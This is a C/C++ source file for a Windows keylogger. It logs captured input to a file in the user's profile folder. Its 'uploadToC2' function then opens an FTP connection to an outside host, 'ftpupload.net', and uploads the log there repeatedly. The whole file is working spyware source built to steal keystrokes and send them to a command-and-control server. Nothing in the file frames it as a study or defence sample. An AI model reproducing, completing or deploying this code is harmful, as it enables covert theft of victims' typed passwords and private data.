
#include "main.h"
#include "keylogger.h"
#include <wininet.h>
#pragma comment(lib,"wininet.lib")

#define INFO_BUFFER_SIZE 32767
TCHAR  infoBuf[INFO_BUFFER_SIZE] = { '\0' };

HANDLE  hFile;


void uploadToC2() {
	auto netHandle = InternetOpen("Ftp Instance", INTERNET_OPEN_TYPE_DIRECT, "", "", 0);
	auto connectionHandle = InternetConnect(netHandle, "ftpupload.net", INTERNET_DEFAULT_FTP_PORT, "xxxxx", "xxxxx", INTERNET_SERVICE_FTP, INTERNET_FLAG_PASSIVE, 0);

	for (int i = 0; i < 100; i++)
	{
		bool result = FtpPutFile(connectionHandle, infoBuf, "logfile.log", 2, 0);
	}
	InternetCloseHandle(netHandle);
	InternetCloseHandle(connectionHandle);
}
int create()
{
	ExpandEnvironmentStrings("%userprofile%\\logfile.log", infoBuf,
		INFO_BUFFER_SIZE);
	
	hFile = CreateFile(infoBuf, GENERIC_WRITE,
		FILE_SHARE_READ, NULL, OPEN_ALWAYS, FILE_ATTRIBUTE_NORMAL, NULL);

	if (!hFile)
		return 0;	
}
void start(const char* text)
{

	DWORD dwBytesWritten = 0;
	SetFilePointer(hFile, NULL, NULL, FILE_END);
	
	WriteFile(hFile, text, strlen(text), &dwBytesWritten, NULL);

}
void end(const char* text)
{
	
	DWORD dwBytesWritten = 0;
	SetFilePointer(hFile, NULL, NULL, FILE_END);
	WriteFile(hFile, text, strlen(text), &dwBytesWritten, NULL);
	
	
}
void keylog(const char* text)
{
	DWORD dwBytesWritten = 0;
	SetFilePointer(hFile, NULL, NULL, FILE_END);
	WriteFile(hFile, text, strlen(text), &dwBytesWritten, NULL);
}
int main(int argc, char* argv[])
{


	int result = create();
	start("\nStarting logger ...\n");
	
	result = startThread(argv);

	end("\nEnding logger ...\n");
	CloseHandle(hFile);
	
	uploadToC2();

	return result;
}